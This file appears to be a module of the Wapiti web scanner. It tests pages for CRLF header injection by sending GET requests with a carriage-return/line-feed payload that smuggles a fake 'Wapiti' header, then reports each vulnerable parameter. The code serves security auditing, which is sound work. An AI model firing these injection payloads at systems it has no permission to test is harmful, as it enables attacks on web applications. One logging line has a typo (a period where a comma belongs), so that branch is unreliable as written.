from attack import Attack
from vulnerability import Vulnerability

class CRLFAttack(Attack):

  def __init__(self,HTTP,xmlRepGenerator,):
    Attack.__init__(self,HTTP,xmlRepGenerator)

  # Won't work with PHP >= 4.4.2
  def attackGET(self,page,dict,attackedGET):
    payload="http://www.google.fr\r\nWapiti: version 1.1.7-alpha"
    if dict=={}:
      err=""
      url=page+"?"+payload
      if url not in attackedGET:
        if self.verbose==2:
          print "+ "+url
        if self.HTTP.send(url).getInfo().has_key('Wapiti'):
          self.reportGen.logVulnerability(Vulnerability.CRLF,Vulnerability.HIGH_LEVEL_VULNERABILITY,
                            page,payload,err+" (QUERY_STRING)")
          print "CRLF Injection (QUERY_STRING) in",page
          print "\tEvil url:",url
        attackedGET.append(url)
    else:
      for k in dict.keys():
        err=""
        tmp=dict.copy()
        tmp[k]=payload
        url=page+"?"+self.HTTP.encode(tmp)
        if url not in attackedGET:
          if self.verbose==2:
            print "+ "+url
          if self.HTTP.send(url).getInfo().has_key('Wapiti'):
            err="CRLF Injection"
            if self.color==0:
              self.reportGen.logVulnerability(Vulnerability.CRLF,Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                page,self.HTTP.encode(tmp),err+" ("+k+")")
              print err,"("+k+") in",page
              print "\tEvil url:",url
            else:
              self.reportGen.logVulnerability(Vulnerability.CRLF,Vulnerability.HIGH_LEVEL_VULNERABILITY,
                                page,self.HTTP.encode(tmp).
                                err+" : "+url.replace(k+"=","\033[0;31m"+k+"\033[0;0m="))
              print err,":",url.replace(k+"=","\033[0;31m"+k+"\033[0;0m=")
          attackedGET.append(url)

